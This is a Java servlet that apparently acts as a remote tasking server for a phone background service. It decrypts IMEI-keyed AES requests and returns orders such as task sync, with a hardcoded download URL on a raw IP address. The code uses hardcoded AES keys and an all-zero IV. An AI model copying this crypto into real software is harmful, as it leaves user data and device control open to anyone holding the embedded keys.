package com.k99k.plserver;

import java.io.IOException;
import java.io.UnsupportedEncodingException;

import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

import com.k99k.tools.StringUtil;
import com.k99k.tools.enc.Base64Coder;

/**s
 * Servlet implementation class PS
 */
public class PS extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    /**
     * @see HttpServlet#HttpServlet()
     */
    public PS() {
        super();
    }
    
//    public static native String CgetUrl();
//   	static {
//   		String libPath  = System.getProperty("java.library.path");  
//   		System.out.println("libPath:"+libPath);
//   		System.load("C:/jdk/bin/libdserv.so");
//   		//System.loadLibrary("dserv");
//   	}
    
    private static byte[] rootkey = {79, 13, 33, -66, -58, 103, 3, -34, -45, 53, 9, 45, 28, -124, 50, -2};
    private static byte[] ivk = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};
    private byte[] rkey = {43, 23, 13, -32, -58, 83, 3, -34, -87, 56, 19, 90, 28, -102, 15, 40};
    // 加密
	public static String encrypt(String sSrc,byte[] key) throws Exception {
		byte[] srcBytes = sSrc.getBytes("utf-8");
		Cipher cipher = null;
		srcBytes = zeroPadding(sSrc);
//		cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
		cipher = Cipher.getInstance("AES/CBC/NoPadding");
		
		SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
		IvParameterSpec iv =  new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());// 使用CBC模式，需要一个向量iv，可增加加密算法的强度
		cipher.init(Cipher.ENCRYPT_MODE, skeySpec, iv);
		byte[] encrypted = cipher.doFinal(srcBytes);
		return Base64Coder.encode(encrypted);
//		return bytePrint(encrypted);
	}
	
	public static String bytePrint(byte[] in){
		StringBuilder sb = new StringBuilder();
		for (int i = 0; i < in.length; i++) {
			sb.append(in[i]);
		}
		return sb.toString();
	}

	
	public static byte[] zeroPadding(String in){
		try {
			byte[] bs = in.getBytes("utf-8");
			int len = bs.length;
			int padding = len % 16;
			byte[] nbs;
			if (padding  != 0) {
				int nlen = len+(16-padding);
				nbs = new byte[nlen];
				System.arraycopy(bs, 0, nbs, 0, len);
				return nbs;
			}else{
				return bs;
			}
		} catch (UnsupportedEncodingException e) {
			e.printStackTrace();
			return null;
		}
	}
	public static byte[] clearPadding(byte[] in){
		int len = in.length;
		int nlen = len;
		for (int i = len-1; i >0; i--) {
			if(in[i] == 0){
				nlen--;
			}else{
				break;
			}
		}
		if (nlen == len) {
			return in;
		}
		byte[] re = new byte[nlen];
		System.arraycopy(in, 0, re, 0, nlen);
		return re;
		
	}
	// 解密
	public static String decrypt(String sSrc,byte[] key) throws Exception {
		try {
			SecretKeySpec skeySpec = new SecretKeySpec(key, "AES");
//			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");
			Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
			
			IvParameterSpec iv = new IvParameterSpec(ivk);//new IvParameterSpec(ivParameter.getBytes());
			cipher.init(Cipher.DECRYPT_MODE, skeySpec, iv);
			byte[] encrypted1 = Base64Coder.decode(sSrc);// 先用base64解密
			byte[] original = cipher.doFinal(encrypted1);
			
			String originalString = new String(clearPadding(original), "utf-8");
//			String originalString = new String(original, "utf-8");
			
			return originalString;
		} catch (Exception ex) {
			return null;
		}
	}     
	
	public static final int ORDER_NONE = 0;
	public static final int ORDER_SYNC_TASK = 1;
	public static final int ORDER_DEL_TASK = 2;
	public static final int ORDER_STOP_SERVICE = 3;
	public static final int ORDER_RESTART_SERVICE = 4;
	public static final int ORDER_UPDATE = 5;
	public static final int ORDER_UPTIME = 6;
	public static final int ORDER_KEY = 7;

    public static final String ERR_PARA = "e01";
    public static final String ERR_DECRYPT = "e02";
    public static final String ERR_KEY_EXPIRED = "e03";
    public static final String ERR_DECRYPT_CLIENT = "e04";
    
    
    private static final String SPLIT_STR = "@@";
    //TODO 暂时写死
    private String taskDownUrl = "http://180.96.63.70:12370/plserver/task";
    private String updateDownUrl = "http://180.96.63.70:12370/plserver/PS";
//    private final static String downloadType = "application/x-msdownload";

//    private String downloadLocalPath = "/usr/plserver/dats/";
    
    private int currentKeyVersion = 1;
    
//    private String tempTaskList = "1";
    
    
    
    
	@Override
	public void init() throws ServletException {
		
//		String str = "16@@A1000037A240A4@@460036120035188@@HTC 609d@@1@@1404116736787@@1404116974258@@";
//		str = "Y4@hj1OSdHBK.SP8SN3KREa.ywiB2pg6Rh2TA0loe6iZEE246bT60cOAJ76nPAmC";
//		str = "A1000037A240A4||1404120179.18484||cn.play.dserv";
//		try {
//			byte[] nkey = {81,84,69,119,77,68,65,119,77,122,100,66,77,106,81,119};
//			String enc = encrypt(str,rootkey);
//			System.out.println("enc:"+enc);
//			System.out.println("dec:"+decrypt(enc,rootkey));
////			System.out.println("base:"+Base64Coder.encodeString("+++"));
//		} catch (Exception e) {
//			e.printStackTrace();
//		}   
		
		super.init();
	}

	/**
	 * @see HttpServlet#doGet(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		setCharset("utf-8",request,response	);
		
		this.doPost(request, response);
		/*
		String tid = request.getParameter("id");
		String kVer = request.getHeader("v");
		
		if (!StringUtil.isDigits(tid) || !StringUtil.isStringWithLen(kVer, 2)) {
			response.setStatus(404);
			response.getWriter().println(ERR_PARA);
			return;
		}
		
		//FIXME 解密v验证
		String vv;
		try {
			vv = decrypt(kVer, rootkey);
			String[] vparas = vv.split("\\|\\|");
			String imei = vparas[0];
			
		} catch (Exception e1) {
			e1.printStackTrace();
		}
		
		
		//TODO 临时更新task列表
		if (request.getParameter("task") != null) {
			String tasks = request.getParameter("task");
			this.tempTaskList = tasks;
			response.getWriter().println(this.tempTaskList);
			return;
		}
		
		
		
		//下载任务文件
		String localPath = this.downloadLocalPath+"/"+tid+".dat";
		File f = new File(localPath);
		if (f.exists()) {
			response.reset();
			response.setContentType(downloadType);
			response.addHeader("Content-Disposition", "attachment; filename=\"" + tid  + ".dat\"");
			int len = (int)f.length();
			response.setContentLength(len);
			if (len > 0) {
				try {
					InputStream inStream = new FileInputStream(f);
					byte[] buf = new byte[4096];
					ServletOutputStream servletOS = response.getOutputStream();
					int readLength;
					while (((readLength = inStream.read(buf)) != -1)) {
						servletOS.write(buf, 0, readLength);
					}
					inStream.close();
					servletOS.flush();
					servletOS.close();
				} catch (IOException e) {
					e.printStackTrace();
				}
			}
			
		}else{
			response.setStatus(404);
			response.getWriter().println(ERR_PARA);
			return;
		}
		*/
	}

	/**
	 * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)
	 */
	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
		setCharset("utf-8",request,response	);
		String enc = request.getParameter("up");
		String kVer = request.getHeader("v");
//		System.out.println("v:"+kVer);
		if (!StringUtil.isStringWithLen(enc, 6)) {
			response.getWriter().println(ERR_PARA);
			return;
		}
		//int keyVersion = (Integer.parseInt(kVer)-17)/27;
		String req = null;
		String imeiKey = null;
		boolean isOldVersion = false;
		try {
			String rkey = decrypt(kVer,rootkey);
//			System.out.println("kVer:"+kVer+" rkey:"+rkey);
			String[] rkeys = rkey.split("\\|\\|");
			imeiKey = Base64Coder.encodeString(rkeys[0]).substring(0, 16);
			byte[] ikey  = new byte[16];
			for (int i = 0; i < 16; i++) {
				ikey[i] = (byte) imeiKey.charAt(i);
			}
			req = decrypt(enc,ikey);
//			System.out.println("dec:"+req);
//			String[] reqs = req.split("@@");
			
		} catch (Exception e) {
			e.printStackTrace();
			response.getWriter().println(ERR_DECRYPT);
			return;
		}
		String[] reqs = req.split(SPLIT_STR);
		if (StringUtil.isDigits(reqs[5]) && Integer.parseInt(reqs[5]) < 3) {
			isOldVersion = true;
		}
//			System.out.println("imeiKey:"+imeiKey+" dec:"+req);
		long uid = 1;
		
		//实现ORDER_SYNC_TASK
		StringBuilder sb = new StringBuilder();
		sb.append(uid).append(SPLIT_STR);
		sb.append(ORDER_SYNC_TASK).append(SPLIT_STR)
		.append(this.taskDownUrl).append(SPLIT_STR);
		//这里仅使用两个测试任务ID,1为toast,2为下载view数据
		if (isOldVersion) {
			sb.append("7");
		}else{
			sb.append("_");
		}
		sb.append(SPLIT_STR)
		.append(this.currentKeyVersion);
		String resp = null;
		try {
//			System.out.println("re:"+sb.toString());
			byte[] ikey  = new byte[16];
			for (int i = 0; i < 16; i++) {
				ikey[i] = (byte) imeiKey.charAt(i);
			}
			resp = encrypt(sb.toString(),ikey);
//			System.out.println("resp:"+resp);
		} catch (Exception e) {
			e.printStackTrace();
		}
		response.getWriter().println(resp);
	}
	/**
	 * 设置输入输出的编码
	 * @param charset
	 * @param req
	 * @param resp
	 * @throws UnsupportedEncodingException
	 */
	public static final void setCharset(String charset,HttpServletRequest req, HttpServletResponse resp) throws UnsupportedEncodingException{
		req.setCharacterEncoding(charset);
		resp.setCharacterEncoding(charset);
		resp.setHeader("Content-Encoding",charset);
		resp.setHeader("content-type","text/html; charset="+charset);
	}
	
	
}
